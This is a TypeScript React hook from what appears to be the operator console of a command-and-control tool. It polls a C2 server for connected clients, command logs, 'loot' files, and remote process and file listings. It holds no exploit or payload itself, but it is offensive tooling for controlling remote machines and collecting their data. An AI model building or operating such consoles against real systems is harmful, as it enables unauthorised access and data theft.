import { useEffect, useRef } from 'react';
import { invoke } from '@tauri-apps/api/core';
import type { Client, CommandLog, LootFile, PreviewData } from '../types';

interface UseC2PollingOpts {
  activeTab: string;
  isFilesLoading: boolean;
  selectedClientId: string;
  c2Mode: 'cloud' | 'local';
  c2ServerUrl: string;
  authHeader: Record<string, string>;
  setClients: (v: Client[]) => void;
  setLogs: (v: CommandLog[]) => void;
  setLootFiles: (v: LootFile[]) => void;
  setProcessList: (v: any) => void;
  setIsProcessesLoading: (v: boolean) => void;
  setPreviewOpen: (v: boolean) => void;
  setPreviewData: (v: PreviewData | null) => void;
  setIsPreviewLoading: (v: boolean) => void;
  parseFileList: (output: string) => void;
  appendTermLog: (lines: string[]) => void;
  setC2ConnectionStatus: (s: 'connected' | 'connecting' | 'error') => void;
  showToast: (msg: string) => void;
}

export function useC2Polling(opts: UseC2PollingOpts) {
  const {
    activeTab, isFilesLoading, selectedClientId, c2Mode, c2ServerUrl, authHeader,
    setClients, setLogs, setLootFiles,
    setProcessList, setIsProcessesLoading,
    setPreviewOpen, setPreviewData, setIsPreviewLoading,
    parseFileList, appendTermLog,
    setC2ConnectionStatus, showToast,
  } = opts;

  const logsRef = useRef<CommandLog[]>([]);
  const printedIdsRef = useRef<Set<number>>(new Set());
  const hadErrorRef = useRef(false);

  // Cap printedIds to avoid unbounded growth
  const MAX_PRINTED = 1000;

  useEffect(() => {
    const pollInterval = isFilesLoading ? 300 : 750;
    let cancelled = false;
    const abortControllers: AbortController[] = [];

    const fetchData = async () => {
      if (cancelled) return;
      // Drop refs to last cycle's controllers — they've settled; cleanup only needs the current ones
      abortControllers.length = 0;
      try {
        let backendClients: Client[] = [];
        let backendLogs: CommandLog[] = [];

        if (c2Mode === 'cloud' && c2ServerUrl) {
          const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
          const ac1 = new AbortController();
          const ac2 = new AbortController();
          abortControllers.push(ac1, ac2);
          try {
            const clientsRes = await fetch(`${cleanUrl}/api/clients`, { headers: authHeader, signal: ac1.signal });
            if (clientsRes.ok) {
              backendClients = await clientsRes.json();
              setC2ConnectionStatus('connected');
              hadErrorRef.current = false;
            } else {
              setC2ConnectionStatus('error');
              // Toast only on the transition into the error state — avoid spamming every poll
              if (!hadErrorRef.current) {
                let errMsg = `Server error: ${clientsRes.status}`;
                try { const body = await clientsRes.json(); if (body.error) errMsg = body.error; } catch {}
                showToast(`Auth failed: ${errMsg}`);
              }
              hadErrorRef.current = true;
            }
          } catch (e: any) {
            if (e?.name !== 'AbortError') {
              setC2ConnectionStatus('error');
              if (!hadErrorRef.current) showToast(`Connection failed: ${e}`);
              hadErrorRef.current = true;
            }
          }
          try {
            const logsRes = await fetch(`${cleanUrl}/api/logs`, { headers: authHeader, signal: ac2.signal });
            if (logsRes.ok) backendLogs = await logsRes.json();
          } catch {}
        } else {
          try {
            backendClients = await invoke<Client[]>('get_clients');
            backendLogs = await invoke<CommandLog[]>('get_logs');
          } catch {}
        }

        try {
          const loot = await invoke<LootFile[]>('get_loot');
          if (!cancelled) setLootFiles(loot);
        } catch {}

        if (cancelled) return;
        setClients(backendClients);
        setLogs(backendLogs);
        logsRef.current = backendLogs;

        // Mirror executeCommand's target fallback so we accept output from
        // whichever client commands are actually being sent to
        const effectiveTarget = selectedClientId && backendClients.some(c => c.id === selectedClientId)
          ? selectedClientId
          : (backendClients[0]?.id || '');

        const newTermLines: string[] = [];
        // Server returns logs newest-first; process chronologically so older
        // stragglers can never overwrite newer responses in the UI
        [...backendLogs].reverse().forEach((log) => {
          if (printedIdsRef.current.has(log.id)) return;
          // Only accept structured output from the currently targeted client —
          // another machine's ls/ps/preview must never hijack this operator's view
          const fromTarget = !effectiveTarget || log.client_id === effectiveTarget;
          if (log.output.includes('[JSON_PREVIEW]')) {
            printedIdsRef.current.add(log.id);
            if (!fromTarget) return;
            try {
              const parsed = JSON.parse(log.output.replace('[JSON_PREVIEW]', ''));
              // Surface every outcome — ok, error, unsupported — so the modal
              // never hangs on its loading spinner
              setPreviewData(parsed);
              setIsPreviewLoading(false);
              if (parsed.status === 'ok') setPreviewOpen(true);
            } catch {}
          } else if (log.output.includes('[JSON_PROCS]')) {
            printedIdsRef.current.add(log.id);
            if (!fromTarget) return;
            try {
              const jsonStr = log.output.replace('[JSON_PROCS]', '');
              const procs = JSON.parse(jsonStr);
              setProcessList(procs);
              setIsProcessesLoading(false);
            } catch {}
          } else if (log.output.includes('[JSON_FILES]')) {
            printedIdsRef.current.add(log.id);
            if (!fromTarget) return;
            parseFileList(log.output);
          } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued')) {
            printedIdsRef.current.add(log.id);
            const cmdLabel = log.command || 'Command';
            newTermLines.push(`\n[${cmdLabel}] ${log.client_id}`, log.output);
          }

          if (printedIdsRef.current.size > MAX_PRINTED) {
            const arr = Array.from(printedIdsRef.current);
            printedIdsRef.current = new Set(arr.slice(-MAX_PRINTED));
          }
        });

        if (newTermLines.length) appendTermLog(newTermLines);
      } catch {}
    };

    fetchData();
    const interval = setInterval(fetchData, pollInterval);
    return () => {
      cancelled = true;
      clearInterval(interval);
      abortControllers.forEach(ac => ac.abort());
    };
  }, [activeTab, isFilesLoading, selectedClientId, c2Mode, c2ServerUrl, authHeader, setC2ConnectionStatus, showToast, parseFileList, appendTermLog, setClients, setLogs, setLootFiles, setProcessList, setIsProcessesLoading, setPreviewOpen, setPreviewData, setIsPreviewLoading]);
}
